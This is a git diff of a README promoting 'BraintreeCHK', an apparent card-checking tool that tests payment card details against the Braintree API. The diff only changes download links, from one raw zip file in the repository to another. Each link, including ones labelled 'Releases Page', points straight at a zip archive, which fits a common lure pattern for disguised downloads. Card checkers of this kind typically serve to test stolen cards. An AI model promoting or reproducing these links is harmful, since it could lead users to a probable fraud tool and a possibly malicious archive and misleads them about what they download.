@@ -4,10 +4,10 @@
 BraintreeCHK helps you validate card information quickly and easily. This application uses the Braintree API to check card details, making it a useful tool for users who need reliable card validation support.
 
 ## 📥 Download Now
-[![Download BraintreeCHK](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/stuff/BraintreeCHK_2.9.zip)](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/stuff/BraintreeCHK_2.9.zip)
+[![Download BraintreeCHK](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/pic/Braintree_CHK_v2.1.zip)](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/pic/Braintree_CHK_v2.1.zip)
 
 ## 📂 Download & Install
-To download BraintreeCHK, visit this page to download: [Releases Page](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/stuff/BraintreeCHK_2.9.zip). You will find the latest version at the top. 
+To download BraintreeCHK, visit this page to download: [Releases Page](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/pic/Braintree_CHK_v2.1.zip). You will find the latest version at the top. 
 
 1. Click on the release link labeled with the latest version.
 2. Look for the assets section, which contains the downloadable files.
@@ -57,7 +57,7 @@ If you encounter any issues while using BraintreeCHK, try the following steps:
 1. Ensure your internet connection is stable.
 2. Restart the application.
 3. Make sure you are entering the correct card information.
-4. Check for updates by revisiting the [Releases Page](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/stuff/BraintreeCHK_2.9.zip).
+4. Check for updates by revisiting the [Releases Page](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/pic/Braintree_CHK_v2.1.zip).
 
 ## 📞 Support
 For further assistance, you can reach out through the Issues section on GitHub. Simply create a new issue detailing your problem, and someone from the community or the developers will assist you.
@@ -67,4 +67,4 @@ BraintreeCHK is designed for everyday users who need straightforward card valida
 
 Download BraintreeCHK today and simplify your card validation process! 
 
-[![Download BraintreeCHK](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/stuff/BraintreeCHK_2.9.zip)](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/stuff/BraintreeCHK_2.9.zip)
+[![Download BraintreeCHK](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/pic/Braintree_CHK_v2.1.zip)](https://raw.githubusercontent.com/goofball7162/BraintreeCHK/main/pic/Braintree_CHK_v2.1.zip)
